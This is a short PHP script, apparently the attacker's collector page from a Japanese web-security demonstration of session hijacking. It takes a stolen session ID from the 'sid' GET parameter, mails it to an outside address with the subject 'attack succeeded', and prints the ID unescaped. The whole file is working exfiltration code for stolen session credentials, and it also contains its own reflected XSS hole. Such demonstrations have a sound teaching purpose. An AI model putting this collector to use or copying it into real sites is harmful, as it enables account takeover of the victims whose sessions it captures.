<?php
   mb_language('Japanese');
   $sid = $_GET['sid'];
   mb_send_mail('zeijaku@zeijaku.jp', '攻撃成功', 'セッションID:' . $sid, 'From: cracked@trap.example.com');
?>
<meta charset='utf-8'>
<body>攻撃成功<br>
<?php echo $sid; ?>
</body>
